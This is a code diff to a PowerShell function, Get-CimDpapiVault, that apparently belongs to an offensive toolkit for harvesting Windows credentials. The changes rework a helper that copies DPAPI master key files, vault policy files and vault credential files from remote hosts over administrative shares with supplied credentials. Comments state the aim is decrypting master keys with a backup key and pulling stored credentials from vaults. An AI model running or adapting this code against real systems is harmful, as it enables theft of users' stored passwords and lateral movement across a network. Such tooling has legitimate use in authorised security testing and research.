@@ -83,6 +83,55 @@ Function Get-CimDpapiVault {
         $psOption = New-PSSessionOption -NoMachineProfile -OperationTimeout $($Timeout*1000)
         $outputDirectory = "$Env:TEMP\$ComputerName"
         $formatDefaultLimit = $global:FormatEnumerationLimit
+        $global:mappedDrives = New-Object Collections.ArrayList
+
+        Function Local:Get-RemoteFile {
+            Param (
+                [Parameter(Mandatory = $True)]
+                [String]
+                $Path,
+
+                [Parameter(Mandatory = $True)]
+                [String]
+                $Destination,
+
+                [ValidateNotNullOrEmpty()]
+                [String]
+                $ComputerName = $env:COMPUTERNAME,
+
+                [ValidateNotNullOrEmpty()]
+                [Management.Automation.PSCredential]
+                [Management.Automation.Credential()]
+                $Credential = [Management.Automation.PSCredential]::Empty
+            )
+            Begin {
+                Function Local:Get-StringHash ([String]$String, $Algorithm="MD5") {
+                    $stringBuilder = New-Object System.Text.StringBuilder
+                    [Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([Text.Encoding]::UTF8.GetBytes($String)) | % {
+                        [Void]$stringBuilder.Append($_.ToString("x2"))
+                    }
+                    return $stringBuilder.ToString()
+                }
+            }
+            Process {
+                # Download file via SMB
+                $fileDrive = ($Path -split ':').Get(0)
+                $filePath = ($Path -split ':').Get(1)
+                if ($Credential.Username) {
+                    $sharePath = "\\$ComputerName\$fileDrive`$"
+                    $localDrive = Get-StringHash $sharePath.ToLower()
+                    if (-not $global:mappedDrives.Contains($localDrive)) {
+                        New-PSDrive -Name $localDrive -Root $sharePath -PSProvider "FileSystem" -Credential $Credential -Scope Global | Out-Null
+                        $global:mappedDrives.add($localDrive) | Out-Null
+                    }
+                    Copy-Item -Path "${localDrive}:$filePath" -Destination $Destination -Recurse
+                }
+                else {
+                    Copy-Item -Path "\\$ComputerName\$fileDrive`$$filePath" -Destination $Destination -Recurse
+                }
+            }
+            End {}
+        }
     }
 
     Process {
@@ -160,12 +209,7 @@ Function Get-CimDpapiVault {
                     # Copy master key file locally
                     $outputFile = "$outputDirectory\$($masterKeyFile.FileName).$($masterKeyFile.Extension)"
                     New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null
-                    if ($psSession) {
-                        Get-RemoteFile -Path $masterKeyFile.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $psSession
-                    }
-                    else {
-                        Get-RemoteFile -Path $masterKeyFile.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
-                    }
+                    Get-RemoteFile -Path $masterKeyFile.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
 
                     $masterKeyBytes = [IO.File]::ReadAllBytes($outputFile)
                     try {
@@ -202,12 +246,7 @@ Function Get-CimDpapiVault {
                         $temp = $_.LocalPath -split "\\"
                         $outputFile = "$outputDirectory\$($temp.get($temp.Count - 1))_$($masterKeyFile.FileName).$($masterKeyFile.Extension)"
                         New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null
-                        if ($psSession) {
-                            Get-RemoteFile -Path $masterKeyFile.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $psSession
-                        }
-                        else {
-                            Get-RemoteFile -Path $masterKeyFile.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
-                        }
+                        Get-RemoteFile -Path $masterKeyFile.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
 
                         # Decrypt user master key using provided backup key
                         $masterKeyBytes = [IO.File]::ReadAllBytes($outputFile)
@@ -244,12 +283,7 @@ Function Get-CimDpapiVault {
                                 $temp = $_.LocalPath -split "\\"
                                 $outputFile = "$outputDirectory\$($temp.get($temp.Count - 1))_$($policyFile.FileName).$($policyFile.Extension)"
                                 New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null
-                                if ($psSession) {
-                                    Get-RemoteFile -Path $policyFile.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $psSession
-                                }
-                                else {
-                                    Get-RemoteFile -Path $policyFile.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
-                                }
+                                Get-RemoteFile -Path $policyFile.Name -Destination $outputFile -ComputerName $ComputerName
 
                                 # Attempt to decrypt the aes128/aes256 keys from the vault policy file
                                 $policyBytes = [IO.File]::ReadAllBytes($outputFile)
@@ -286,12 +320,7 @@ Function Get-CimDpapiVault {
                                         $temp = $_.LocalPath -split "\\"
                                         $outputFile = "$outputDirectory\$($temp.get($temp.Count - 1))_$($vaultFile.FileName).$($vaultFile.Extension)"
                                         New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null
-                                        if ($psSession) {
-                                            Get-RemoteFile -Path $vaultFile.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $psSession
-                                        }
-                                        else {
-                                            Get-RemoteFile -Path $vaultFile.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
-                                        }
+                                        Get-RemoteFile -Path $vaultFile.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
 
                                         # Attempt to decrypt credentials from the vault file
                                         $vaultBytes = [IO.File]::ReadAllBytes($outputFile)
@@ -328,6 +357,11 @@ Function Get-CimDpapiVault {
         if ($psSession) {
             Remove-PSSession -Session $psSession
         }
+        # Remove mapped drives
+        foreach ($mappedDrive in $global:mappedDrives) {
+            Remove-PSDrive $mappedDrive
+        }
+        $global:mappedDrives = $null
         # Restore output limit
         $global:FormatEnumerationLimit = $formatDefaultLimit
     }
@@ -539,63 +573,6 @@ Function Local:Get-CimDirectory {
         if ($Recurse -and $subDir) {
             foreach ($directory in $subDir) {
                 Get-CimDirectory -Path $directory.Name -Recurse -CimSession $cimSession
-            }
-        }
-    }
-
-    End {}
-}
-
-Function Local:Get-RemoteFile {
-    Param (
-        [Parameter(Mandatory = $True)]
-        [String]
-        $Path,
-
-        [Parameter(Mandatory = $True)]
-        [String]
-        $Destination,
-
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $ComputerName = $env:COMPUTERNAME,
-
-        [ValidateNotNullOrEmpty()]
-        [Management.Automation.PSCredential]
-        [Management.Automation.Credential()]
-        $Credential = [Management.Automation.PSCredential]::Empty,
-
-        [Management.Automation.Runspaces.PSSession]
-        $PSSession
-    )
-
-    Begin {
-        Function Local:Get-StringHash ([String]$String, $Algorithm="MD5") { 
-            $stringBuilder = New-Object System.Text.StringBuilder 
-            [Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([Text.Encoding]::UTF8.GetBytes($String)) | % { 
-                [Void]$stringBuilder.Append($_.ToString("x2")) 
-            } 
-            return $stringBuilder.ToString() 
-        }
-    }
-
-    Process {
-        if ($PSSession) {
-            # Download file via PSRemoting
-            Copy-Item -Path $Path -Destination $Destination -FromSession $PSSession -Recurse
-        }
-        else {
-            # Download file via SMB
-            $fileDrive = ($Path -split ':').Get(0)
-            $filePath = ($Path -split ':').Get(1)
-            if ($Credential.Username) {
-                $drive = Get-StringHash $ComputerName
-                New-PSDrive -Name $drive -Root "\\$ComputerName\$fileDrive`$" -PSProvider "FileSystem" -Credential $Credential | Out-Null
-                Copy-Item -Path "${drive}:$filePath" -Destination $Destination -Recurse
-                Remove-PSDrive $drive
-            }
-            else {
-                Copy-Item -Path "\\$ComputerName\$fileDrive`$$filePath" -Destination $Destination -Recurse
             }
         }
     }
